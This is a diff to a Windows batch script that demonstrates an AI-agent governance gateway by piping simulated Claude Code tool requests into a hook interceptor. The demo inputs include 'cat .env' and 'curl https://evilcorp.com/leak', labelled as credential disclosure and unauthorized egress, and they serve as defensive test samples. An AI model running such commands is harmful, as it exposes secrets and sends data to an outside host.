@@ -346,38 +346,45 @@ echo.
 set /p LAUNCH_CLAUDE="Select option (1, 2, or 3) [default: 3]: "
 if "%LAUNCH_CLAUDE%"=="" set LAUNCH_CLAUDE=3
 
-if "%LAUNCH_CLAUDE%"=="1" (
-    echo.
-    echo [*] Executing automated Claude Code hook demonstration (cchook\interceptor.exe)...
-    set CLAUDE_DEMO_SESS=sess-claude-auto-%RANDOM%
-    curl.exe -s -X POST "%SERVER_URL%/api/v1/sessions/start" ^
-        -H "Content-Type: application/json" ^
-        -d "{\"session_id\":\"!CLAUDE_DEMO_SESS!\",\"app_id\":\"claude-code\",\"user_id\":\"%DEMO_USER%\",\"hostname\":\"%COMPUTERNAME%\"}" >nul 2>&1
+if "%LAUNCH_CLAUDE%"=="1" goto run_claude_auto
+if "%LAUNCH_CLAUDE%"=="2" goto run_claude_interactive
+goto after_claude_options
 
-    set BAP_SESSION_ID=!CLAUDE_DEMO_SESS!
-    echo.
-    echo  [TOOL 1/3] Claude requests 'git status' (developer productivity)...
-    echo {"hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"git status"}} | "%~dp0cchook\interceptor.exe"
-    echo.
-    echo  [TOOL 2/3] Claude requests 'cat .env' (sensitive credential disclosure)...
-    echo {"hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"cat .env"}} | "%~dp0cchook\interceptor.exe"
-    echo.
-    echo  [TOOL 3/3] Claude requests 'curl https://evilcorp.com/leak' (unauthorized egress)...
-    echo {"hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"curl https://evilcorp.com/leak"}} | "%~dp0cchook\interceptor.exe"
-    echo.
+:run_claude_auto
+echo.
+echo [*] Executing automated Claude Code hook demonstration [cchook\interceptor.exe]...
+set CLAUDE_DEMO_SESS=sess-claude-auto-%RANDOM%
+curl.exe -s -X POST "%SERVER_URL%/api/v1/sessions/start" ^
+    -H "Content-Type: application/json" ^
+    -d "{\"session_id\":\"!CLAUDE_DEMO_SESS!\",\"app_id\":\"claude-code\",\"user_id\":\"%DEMO_USER%\",\"hostname\":\"%COMPUTERNAME%\"}" >nul 2>&1
 
-    curl.exe -s --max-time 2 --connect-timeout 2 -X POST "%SERVER_URL%/api/v1/sessions/end" ^
-        -H "Content-Type: application/json" ^
-        -d "{\"session_id\":\"!CLAUDE_DEMO_SESS!\",\"reason\":\"automated hook test completed\"}" >nul 2>&1
-    echo [+] Claude Code demonstration session closed ^& deregistered cleanly.
-)
-if "%LAUNCH_CLAUDE%"=="2" (
-    echo.
-    echo [*] Launching interactive Claude Code in dedicated governed window...
-    echo [*] Type 'exit' inside Claude Code when finished to return here.
-    start /wait cmd.exe /c "call run_claude_ollama.bat"
-    curl.exe -s --max-time 2 --connect-timeout 2 -X POST "%SERVER_URL%/api/v1/sessions/reset" >nul 2>&1
-)
+set BAP_SESSION_ID=!CLAUDE_DEMO_SESS!
+echo.
+echo  [TOOL 1/3] Claude requests 'git status' [developer productivity]...
+echo {"hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"git status"}} | "%~dp0cchook\interceptor.exe"
+echo.
+echo  [TOOL 2/3] Claude requests 'cat .env' [sensitive credential disclosure]...
+echo {"hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"cat .env"}} | "%~dp0cchook\interceptor.exe"
+echo.
+echo  [TOOL 3/3] Claude requests 'curl https://evilcorp.com/leak' [unauthorized egress]...
+echo {"hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"curl https://evilcorp.com/leak"}} | "%~dp0cchook\interceptor.exe"
+echo.
+
+curl.exe -s --max-time 2 --connect-timeout 2 -X POST "%SERVER_URL%/api/v1/sessions/end" ^
+    -H "Content-Type: application/json" ^
+    -d "{\"session_id\":\"!CLAUDE_DEMO_SESS!\",\"reason\":\"automated hook test completed\"}" >nul 2>&1
+echo [+] Claude Code demonstration session closed and deregistered cleanly.
+goto after_claude_options
+
+:run_claude_interactive
+echo.
+echo [*] Launching interactive Claude Code in dedicated governed window...
+echo [*] Type 'exit' inside Claude Code when finished to return here.
+start /wait cmd.exe /c "call run_claude_ollama.bat"
+curl.exe -s --max-time 2 --connect-timeout 2 -X POST "%SERVER_URL%/api/v1/sessions/reset" >nul 2>&1
+goto after_claude_options
+
+:after_claude_options
 
 echo.
 echo [*] Deregistering demonstration session %SESS_ID% from Central Control Plane...
@@ -417,18 +424,25 @@ echo.
 set /p TEARDOWN_CHOICE="Select option (1 or 2) [default: 2]: "
 if "%TEARDOWN_CHOICE%"=="" set TEARDOWN_CHOICE=2
 
-if "%TEARDOWN_CHOICE%"=="1" (
-    echo.
-    echo [*] Stopping BAP Gateway PEP on port 9090...
-    taskkill /F /IM bapgateway.exe >nul 2>&1
-    echo [*] Stopping BAP Control Plane on port 8080...
-    taskkill /F /IM bapcontrolplane.exe >nul 2>&1
-    echo [+] All BAP demo processes cleanly terminated. Ports 8080 and 9090 are freed!
-) else (
-    echo.
-    echo [*] BAP Control Plane remains active on http://localhost:8080.
-    echo [*] When finished inspecting, simply run: stop_demo.bat
-)
+if "%TEARDOWN_CHOICE%"=="1" goto do_teardown_clean
+goto do_teardown_keep
+
+:do_teardown_clean
+echo.
+echo [*] Stopping BAP Gateway PEP on port 9090...
+taskkill /F /IM bapgateway.exe >nul 2>&1
+echo [*] Stopping BAP Control Plane on port 8080...
+taskkill /F /IM bapcontrolplane.exe >nul 2>&1
+echo [+] All BAP demo processes cleanly terminated. Ports 8080 and 9090 are freed!
+goto after_teardown
+
+:do_teardown_keep
+echo.
+echo [*] BAP Control Plane remains active on http://localhost:8080.
+echo [*] When finished inspecting, simply run: stop_demo.bat
+goto after_teardown
+
+:after_teardown
 echo.
 echo ====================================================================================================
 echo  Demonstration finished. This console window will remain open.
